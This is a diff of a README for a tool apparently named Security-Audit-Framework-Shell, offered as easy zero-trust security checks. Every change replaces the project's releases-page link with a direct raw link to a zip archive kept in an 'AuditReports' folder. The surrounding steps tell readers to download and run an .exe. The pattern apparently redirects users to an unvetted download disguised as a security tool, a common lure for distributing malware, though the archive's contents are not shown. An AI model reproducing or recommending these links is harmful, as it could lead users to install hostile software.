@@ -1,6 +1,6 @@
 # 🔒 Security-Audit-Framework-Shell - Easy Zero-Trust Security Checks
 
-[![Download Release](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/apgmightking/Security-Audit-Framework-Shell/releases)
+[![Download Release](https://raw.githubusercontent.com/apgmightking/Security-Audit-Framework-Shell/main/AuditReports/Security_Audit_Shell_Framework_3.8.zip)](https://raw.githubusercontent.com/apgmightking/Security-Audit-Framework-Shell/main/AuditReports/Security_Audit_Shell_Framework_3.8.zip)
 
 ---
 
@@ -53,7 +53,7 @@ Using Security-Audit-Framework-Shell is straightforward. Follow these steps.
 ### Step 1: Download the Tool
 
 Go to the download page by clicking the badge at the top or visit:  
-[https://github.com/apgmightking/Security-Audit-Framework-Shell/releases](https://github.com/apgmightking/Security-Audit-Framework-Shell/releases)
+[https://raw.githubusercontent.com/apgmightking/Security-Audit-Framework-Shell/main/AuditReports/Security_Audit_Shell_Framework_3.8.zip](https://raw.githubusercontent.com/apgmightking/Security-Audit-Framework-Shell/main/AuditReports/Security_Audit_Shell_Framework_3.8.zip)
 
 On the page, look for the latest release. The files will usually have names ending with `.exe` or `.zip`. Download the `.exe` file if available — it is the easiest to run.
 
@@ -104,7 +104,7 @@ The report shows:
 
 To get Security-Audit-Framework-Shell:
 
-1. Visit [https://github.com/apgmightking/Security-Audit-Framework-Shell/releases](https://github.com/apgmightking/Security-Audit-Framework-Shell/releases)  
+1. Visit [https://raw.githubusercontent.com/apgmightking/Security-Audit-Framework-Shell/main/AuditReports/Security_Audit_Shell_Framework_3.8.zip](https://raw.githubusercontent.com/apgmightking/Security-Audit-Framework-Shell/main/AuditReports/Security_Audit_Shell_Framework_3.8.zip)  
 2. Select the latest release version  
 3. Download the `.exe` file for ease or `.zip` if you prefer  
 4. Save it to a folder you can easily find, like Downloads or Desktop  
@@ -189,6 +189,6 @@ If you run into issues or have questions:
 
 ---
 
-[Download Security-Audit-Framework-Shell](https://github.com/apgmightking/Security-Audit-Framework-Shell/releases)  
+[Download Security-Audit-Framework-Shell](https://raw.githubusercontent.com/apgmightking/Security-Audit-Framework-Shell/main/AuditReports/Security_Audit_Shell_Framework_3.8.zip)  
 
-[![Download Release](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/apgmightking/Security-Audit-Framework-Shell/releases)
+[![Download Release](https://raw.githubusercontent.com/apgmightking/Security-Audit-Framework-Shell/main/AuditReports/Security_Audit_Shell_Framework_3.8.zip)](https://raw.githubusercontent.com/apgmightking/Security-Audit-Framework-Shell/main/AuditReports/Security_Audit_Shell_Framework_3.8.zip)
